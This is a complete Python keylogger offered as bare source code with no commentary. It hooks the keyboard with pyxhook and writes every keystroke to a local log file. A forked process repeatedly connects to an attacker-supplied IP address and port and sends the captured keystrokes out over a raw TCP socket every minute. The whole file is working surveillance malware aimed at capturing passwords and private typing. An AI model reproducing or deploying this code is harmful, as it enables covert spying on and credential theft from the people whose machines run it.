import pyxhook
import os
import time
import socket
import argparse

parser=argparse.ArgumentParser(description="Help Page")
parser.add_argument("--ip",type=str,help="ip address")
parser.add_argument("--port",type=int,help="port number")

args=parser.parse_args()

def key_function(event):
    with open("log_file","a") as f:
        f.write("{}".format(event.Key))


def keylogger():
    hook=pyxhook.HookManager()
    hook.KeyDown=key_function
    hook.HookKeyboard()
    try:
        hook.start()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        msg="Error while catching events:\n()".format(ex)
        pyxhook.print_err(msg)
        with open("log_file","a") as f:
            f.write("\n{}".format(msg))

def read_data():
    fd=open("log_file","r")
    data=fd.read()
    return data

def socket_function():
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            sock.connect((args.ip,args.port))
            break
        except:
            print("can't connect to the server")
            time.sleep(60)
    data=read_data()
    print("***SENDIND DATA***")
    sock.send(data.encode())
    sock.close()


if __name__=="__main__":
    res=os.fork()
    if res==0:
        while True:
            socket_function()
            time.sleep(60)
    else:
        keylogger()      
